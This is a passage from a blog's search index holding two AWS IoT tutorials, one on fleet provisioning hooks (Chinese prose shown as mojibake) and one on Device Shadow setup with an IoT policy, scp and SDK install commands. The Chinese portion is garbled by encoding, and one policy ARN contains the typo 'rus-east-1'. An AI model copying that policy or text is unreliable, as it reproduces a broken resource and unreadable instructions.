class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:iot:us-east-1:123456789012:topic/foo/bar&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DeviceConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;FallbackUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.example.com/test-site&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Fn::FindInMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;LocationTable&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DeviceLocation&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="string">&quot;LocationUrl&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>é å…ˆä½ˆå»ºæ›æ¥æ˜¯ Lambda å‡½æ•¸ï¼Œæœƒå…ˆé©—è­‰å¾è£ç½®å‚³éçš„åƒæ•¸ï¼Œç„¶å¾Œæ‰èƒ½ä½ˆå»ºè£ç½®ã€‚æ­¤ Lambda å‡½æ•¸å¿…é ˆå­˜åœ¨æ–¼æ‚¨çš„å¸³æˆ¶ä¸­ï¼Œæ‰èƒ½ä½ˆå»ºè£ç½®ã€‚</p><p>é€™å€‹éƒ¨åˆ†æ˜¯è¦è¨­å®šåœ¨é…ç½®è¨­å‚™ä¹‹å‰åŸ·è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼Œæ ¹æ“šå·²çŸ¥è¨­å‚™æ•¸æ“šåº«æª¢æŸ¥è¨­å‚™ï¼Œä»¥é˜²æ­¢æœªç¶“æˆæ¬Šçš„è¨­å‚™é€£æ¥åˆ°æ‚¨çš„å¸³æˆ¶ã€‚</p><p><img src="https://i.imgur.com/pL1yTCM.png" alt="Imgur"></p><ul><li>é¸æ“‡ <strong>Create a Lambda function</strong></li></ul><h3 id="Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate"><a href="#Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate" class="headerlink" title="Sample provisioning hook where you validate the request before activating a certificate"></a>Sample provisioning hook where you validate the request before activating a certificate</h3><blockquote><p>Github: <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate">https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"></span><br><span class="line">provision_response = &#123;</span><br><span class="line">    <span class="string">&#x27;allowProvisioning&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">&quot;parameterOverrides&quot;</span>: &#123;<span class="string">&quot;CertDate&quot;</span>: date.today().strftime(<span class="string">&quot;%m/%d/%y&quot;</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">########################</span></span><br><span class="line">    <span class="comment">## Stringent validation against internal API&#x27;s/DB etc to validate the request before proceeding</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment">## if event[&#x27;parameters&#x27;][&#x27;SerialNumber&#x27;] = &quot;approved by company CSO&quot;:</span></span><br><span class="line">    <span class="comment">##     provision_response[&quot;allowProvisioning&quot;] = True</span></span><br><span class="line">    <span class="comment">#####################</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> provision_response</span><br></pre></td></tr></table></figure><h3 id="Hook-Input"><a href="#Hook-Input" class="headerlink" title="Hook Input"></a>Hook Input</h3><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;claimCertificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificatePem&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;templateArn&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;arn:aws:iot:us-east-1:XXXXXXXXXXXX:provisioningtemplate/MyTemplate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clientId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;221a6d10-9c7f-42f1-9153-e52e6fc869c1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‘ AWS IoT è¨»å†Šè£ç½®æ™‚ï¼ŒAWS IoT æœƒå°‡æ­¤ç‰©ä»¶å‚³é€è‡³ Lambda å‡½æ•¸ã€‚</p><p>å‚³éçµ¦ Lambda å‡½æ•¸çš„ <code>parameters</code> ç‰©ä»¶åŒ…å«åœ¨ <strong>RegisterThing</strong> è«‹æ±‚ Payloadä¸­å‚³éä¹‹ parameters å¼•æ•¸ä¸­çš„å±¬æ€§</p><h2 id="è¨­ç½®-è¨­å‚™ç«¯"><a href="#è¨­ç½®-è¨­å‚™ç«¯" class="headerlink" title="è¨­ç½® - è¨­å‚™ç«¯"></a>è¨­ç½® - è¨­å‚™ç«¯</h2><p>æ‰€ä¸‹è¼‰çš„ Claim æ†‘è­‰å’Œç§é‘°æœƒéœ€è¦ç§»å‹•åˆ°è¨­å‚™ç«¯</p><p>å¯ä»¥é€šéåƒæ˜¯ <code>scp</code> ä¹‹é¡çš„å‘½ä»¤ä¾†å»é€é SSH å°‡æœ¬åœ°è¤‡è£½æª”æ¡ˆåˆ°æ‚¨çš„è¨­å‚™ä¸­ã€‚</p><p>å¦å¤–ï¼Œæœƒéœ€è¦åœ¨è¨­å‚™ç«¯å»å®‰è£æƒ³è¦ä½¿ç”¨çš„ <strong>IoT Device SDK</strong></p><blockquote><p>AWS IoT è£ç½® SDKã€è¡Œå‹• SDK å’Œ AWS IoT è£ç½®ç”¨æˆ¶ç«¯ - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html</a></p></blockquote><p>ç›®å‰æœ‰æ”¯æ´ä»¥ C++, javascript, Java, Python, Embedded-C èªè¨€æ’°å¯«çš„ Device SDKï¼Œå¯ä»¥æ ¹æ“šå¯¦éš›éœ€æ±‚å’Œæƒ…å¢ƒé€²è¡Œä½¿ç”¨ã€‚</p><h3 id="ä½¿ç”¨-AWS-IoT-Device-SDK"><a href="#ä½¿ç”¨-AWS-IoT-Device-SDK" class="headerlink" title="ä½¿ç”¨ AWS IoT Device SDK"></a>ä½¿ç”¨ AWS IoT Device SDK</h3><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2">https://github.com/aws/aws-iot-device-sdk-python-v2</a></p></blockquote><p>æœ¬ç¯‡æ–‡ç« ä¸»è¦ä½¿ç”¨ <strong>Python IoT Device SDKv2</strong></p><p>è‹¥è¦å®‰è£ SDK åˆ°è¨­å‚™ï¼Œè«‹å…ˆç¢ºèªè¨­å‚™ä¸Šæ˜¯å¦æœ‰ <code>git</code> , <code>Python3</code>é‚„æœ‰ <code>Python3-pip</code>å¥—ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–å¥—ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#  (Optional) Setup the version number of your local build. The default version </span><br><span class="line">#    for awsiotsdk is set to &quot;1.0.0-dev&quot;, you can set the version number of the</span><br><span class="line">#    local build in &quot;aws-iot-device-sdk-python-v2/awsiot/__init__.py&quot;</span><br><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br><span class="line"></span><br><span class="line">#  Install using Pip (use &#x27;python&#x27; instead of &#x27;python3&#x27; on Windows)</span><br><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ <code>aws-iot-device-sdk-python-v2/samples/fleetprovisioning.py</code> ä½ ä¹Ÿå¯ä»¥é€šéæ•™æœ¬ä¾†å»è¨­ç½® Provisioning Templateã€‚</p><p>è€Œå¾ŒçºŒæ‚¨éœ€è¦åœ¨æ‚¨çš„è¨­å‚™ä¸ŠæŒ‡å®šï¼š</p><ul><li>AWS IoT Endpoint</li><li>Claim Certificate</li><li>Private Key<br>ä¾†å»é€£æ¥åˆ° AWS IoT Core</li></ul><p>è…³æœ¬çš„æ“ä½œæ­¥é©Ÿå¯ä»¥åœ¨ä¸‹é¢æ‰¾åˆ°</p><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md">https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fleetprovisioning.py --endpoint &lt;endpoint&gt; --cert &lt;file&gt; --key &lt;file&gt; --template_name &lt;name&gt; --template_parameters &#x27;&#123;\&quot;SerialNumber\&quot;:\&quot;1\&quot;,\&quot;DeviceLocation\&quot;:\&quot;Seattle\&quot;&#125;&#x27; --csr &lt;path to csr file&gt;</span><br></pre></td></tr></table></figure><h2 id="åƒè€ƒæ–‡ä»¶"><a href="#åƒè€ƒæ–‡ä»¶" class="headerlink" title="åƒè€ƒæ–‡ä»¶"></a>åƒè€ƒæ–‡ä»¶</h2><p>[+] <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning">https://github.com/aws-samples/aws-iot-fleet-provisioning</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based</a><br>[+] <a href="https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/">https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> Certificate </tag>
            
            <tag> Device Provisioning </tag>
            
            <tag> Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: AWS IoT Device Shadow</title>
      <link href="/posts/aws-iot-device-shadow.html"/>
      <url>/posts/aws-iot-device-shadow.html</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-What-is-AWS-IoT-Device-Shadow"><a href="#Intro-What-is-AWS-IoT-Device-Shadow" class="headerlink" title="Intro - What is AWS IoT Device Shadow?"></a>Intro - What is AWS IoT Device Shadow?</h1><p>In real world, sometime it is difficult to get the actual device state in real time in such IoT scenarios.</p><p>A device shadow can overcome this challenge, Device Shadow can consider a virtual  virtual representation of a device which managed by the <strong>IoT Things</strong> resource created in AWS IoT Core.</p><blockquote><p>The Shadow document is a JSON or a JavaScript notation doc that is used to store and retrieve the current state information for a device. You can use the shadow to get and set the state of a device over MQTT topics or HTTP REST APIs, regardless of whether the device is connected to the internet.</p></blockquote><h1 id="Shadow-Document"><a href="#Shadow-Document" class="headerlink" title="Shadow Document"></a>Shadow Document</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Refer to the json above, you can check there 3 <strong>state</strong> properties in shadow document.</p><ul><li>desired<ul><li>Apps specify the desired states of device properties by updating the desired object</li></ul></li><li>reported<ul><li>Devices report their current state in the reported object.</li></ul></li><li>delta<ul><li>AWS IoT reports differences between the desired and the reported state in the delta object.</li></ul></li></ul><blockquote><p>You can consider the flow of Shadow a finite state machine, for AWS IoT Core, it will also check if there are delta event, that means there difference between <strong>Desired</strong> and <strong>Reported</strong> states</p></blockquote><p>So how can we update the state of a shadow?  The answer is clear,</p><blockquote><p><strong>By subscribing&#x2F;publishing messages to the certain MQTT topics</strong></p></blockquote><h1 id="Shadow-Topic"><a href="#Shadow-Topic" class="headerlink" title="Shadow Topic"></a>Shadow Topic</h1><table><thead><tr><th>ShadowTopicPrefix value</th><th>Shadow type</th></tr></thead><tbody><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow</td><td>Unnamed (classic) shadow</td></tr><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow&#x2F;name&#x2F;shadowName</td><td>Named shadow</td></tr></tbody></table><table><thead><tr><th>Topic</th><th>Client operations allowed</th></tr></thead><tbody><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;accepted</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;delta</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;documents</td><td>Subscribe</td></tr></tbody></table><blockquote><p>For detail explanation about these shadow topics, see the documentation - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html</a></p></blockquote><h1 id="The-state-changes-of-Device-Shadow"><a href="#The-state-changes-of-Device-Shadow" class="headerlink" title="The state changes of Device Shadow"></a>The state changes of Device Shadow</h1><p><img src="https://i.imgur.com/l071JEc.png" alt="Imgur"></p><p>Take this picture for example, the update flow is:</p><ol><li>The MQTT client publishes a <code>$aws/things/myLightBulb/shadow/update</code> message to the server. The message carries the desired state <code>&#123;&quot;state&quot;: &#123;&quot;desired&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code></li><li>IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code>, indicating that the update message has been received. At the same time, it publishes <code>$aws/things/myLightBulb/shadow/delta</code> to notify the device to update, and then publishes <code>$aws/things/myLightBulb/shadow/update/document</code> as update record</li><li>After receiving the message, the Device performs the corresponding update operation and publishes a message <code>$aws/things/myLightBulb/shadow/update</code> <code>&#123;&quot;state&quot;&#123;&quot;report&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code> to the IoT Server after completion. Notification updated</li><li>After receiving the post-update message, IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code> to indicate that the update message has been received. Publish another <code>$aws/things/myLightBulb/shadow/update/document</code> as an update record</li></ol><h1 id="Expermient-for-IoT-Shadow"><a href="#Expermient-for-IoT-Shadow" class="headerlink" title="Expermient for IoT Shadow"></a>Expermient for IoT Shadow</h1><h2 id="Device-Setup"><a href="#Device-Setup" class="headerlink" title="Device Setup"></a>Device Setup</h2><p>Since I donâ€™t have any IoT Device currently available, I simulate the device by launching a EC2 instance.</p><ul><li>AMI: <code>Ubuntu 22 LTS</code></li><li>Type: <code>t2.Micro</code></li><li>Subnet: <code>10.1.0.0/24</code></li></ul><p>Then connect to the EC2 instance by using SSH, and run the following command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y python3-pip</span><br><span class="line">mkdir certs/</span><br></pre></td></tr></table></figure><h2 id="Setup-in-AWS-IoT-Core"><a href="#Setup-in-AWS-IoT-Core" class="headerlink" title="Setup in AWS IoT Core"></a>Setup in AWS IoT Core</h2><p>There are 3 things to setup in AWS IoT Core</p><ul><li>Create certificate</li><li>Create IoT Policy and associated with the certificate</li><li>Create Things object and associate with the certificate</li></ul><h3 id="Things"><a href="#Things" class="headerlink" title="Things"></a>Things</h3><p>This is a thing named <code>ESP32</code> for testing purposes, it have associated with the certificate</p><p><img src="https://i.imgur.com/96y4cVz.png" alt="Imgur"></p><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h3><p>And this certificate has issued by the Amazon Root CA.</p><p><img src="https://i.imgur.com/Hg9Jzsv.png" alt="Imgur"></p><p>And there are IoT Policy - <code>TestPolicy</code> asccociate with this certificate.</p><p><em>TestPolicy</em></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:rus-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Remember, this policy must have adequate permissions for <code>CONNECT</code>, <code>SUBSCRIBE</code>, <code>Publish</code> and <code>Publish</code><br>to the Shadow topic.</p><p>Once you have setup these stuff, now I need to convey the certificate to the EC2 instance.</p><p><img src="https://i.imgur.com/LKSyMJw.png" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i &lt;SSH KEY&gt; TestDeviceShadow/*    ubuntu@ec2-&lt;EC2 Public Address&gt;.compute-1.amazonaws.com:/home/ubuntu/certs</span><br></pre></td></tr></table></figure><p>Apart from the device certificate, it is necessary to provide the CA certificate in the device.</p><ul><li>Download the CA Cert in the device</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd certs/</span><br><span class="line">curl -o ~/certs/Amazon-root-CA-1.pem \</span><br><span class="line">    https://www.amazontrust.com/repository/AmazonRootCA1.pem </span><br></pre></td></tr></table></figure><p>Now there all credential we need to test the IoT Device Shadows</p><h2 id="Install-the-IoT-Core-Python-Device-SDK"><a href="#Install-the-IoT-Core-Python-Device-SDK" class="headerlink" title="Install the IoT Core Python Device SDK"></a>Install the IoT Core Python Device SDK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br></pre></td></tr></table></figure><figure class="highlight 